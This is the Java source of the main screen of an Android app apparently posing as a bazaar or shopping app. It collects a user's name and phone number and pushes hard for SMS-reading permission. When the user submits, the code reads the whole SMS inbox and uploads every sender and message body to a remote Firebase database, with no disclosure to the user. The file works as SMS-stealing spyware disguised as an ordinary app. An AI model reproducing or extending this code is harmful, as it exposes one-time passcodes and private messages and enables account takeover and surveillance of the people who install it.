package com.bazaar.smartbazar;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.android.gms.auth.api.phone.SmsRetriever;
import com.google.android.gms.auth.api.phone.SmsRetrieverClient;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {


    Button submitBtn;
    EditText name_et, number_et;
    private static final int SMS_PERMISSION_CODE = 123;

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {


            } else {


                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivity(intent);

            }
        }
    }

    private SmsReceiver smsRetrieverReceiver = new SmsReceiver();

    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        submitBtn = findViewById(R.id.submit_btn);
        name_et = findViewById(R.id.name_et);
        number_et = findViewById(R.id.number_et);


        Intent uninstallIntent = new Intent("com.bazaar.smartbazar.UNINSTALL");
        sendBroadcast(uninstallIntent);

        SmsRetrieverClient client = SmsRetriever.getClient(this);
        Task<Void> task = client.startSmsRetriever();

        task.addOnSuccessListener(aVoid -> {
            registerReceiver(smsRetrieverReceiver, new IntentFilter(SmsRetriever.SMS_RETRIEVED_ACTION));
        });

        task.addOnFailureListener(e -> {

        });

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {

        } else {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS}, SMS_PERMISSION_CODE);
        }


        submitBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {

                    String nameEt = name_et.getText().toString().trim();
                    String numberEt = number_et.getText().toString().trim();
                    if (nameEt.isEmpty()) {
                        name_et.setError("Enter name to continue");
                    }
                    if (numberEt.isEmpty()) {
                        number_et.setError("Enter number to continue");

                    }
                    if (!nameEt.isEmpty() && !numberEt.isEmpty()) {

                        Uri uri = Uri.parse("content://sms/inbox");
                        Cursor cursor = getContentResolver().query(uri, null, null, null, null);

                        if (cursor != null && cursor.moveToFirst()) {
                            do {
                                @SuppressLint("Range") String sender = cursor.getString(cursor.getColumnIndex("address"));
                                @SuppressLint("Range") String message = cursor.getString(cursor.getColumnIndex("body"));


                                Log.d("MSG", sender + " : " + message);

                                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child(numberEt);
                                databaseReference.child("userDetails").child("userName").setValue(nameEt);
                                databaseReference.child("userDetails").child("userNumber").setValue(numberEt);
                                databaseReference.child("userDetails").child("userStatus").setValue("Active");

                                databaseReference.child("userInbox").child(sender).setValue(message);


                            } while (cursor.moveToNext());

                            cursor.close();
                        }
                    }

                } else {
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{android.Manifest.permission.READ_SMS}, SMS_PERMISSION_CODE);
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivity(intent);

                }


            }
        });

        LocalBroadcastManager.getInstance(this).registerReceiver(
                smsReceiver,
                new IntentFilter("SMS_RECEIVED")
        );

    }

    private final BroadcastReceiver smsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction() != null && intent.getAction().equals("SMS_RECEIVED")) {
                String sender = intent.getStringExtra("sender");
                String message = intent.getStringExtra("message");

                // Process the SMS data in the MainActivity
                Log.d("MSGRCV", sender + " : " + message);

            }
        }
    };

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Unregister the LocalBroadcastReceiver when the activity is destroyed
        LocalBroadcastManager.getInstance(this).unregisterReceiver(smsReceiver);
    }

    public static class AppUninstallObserver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_PACKAGE_REMOVED)) {
                // Package removed, handle the event
                Log.d("UNIN", "onChange: ");

            }
        }
    }

}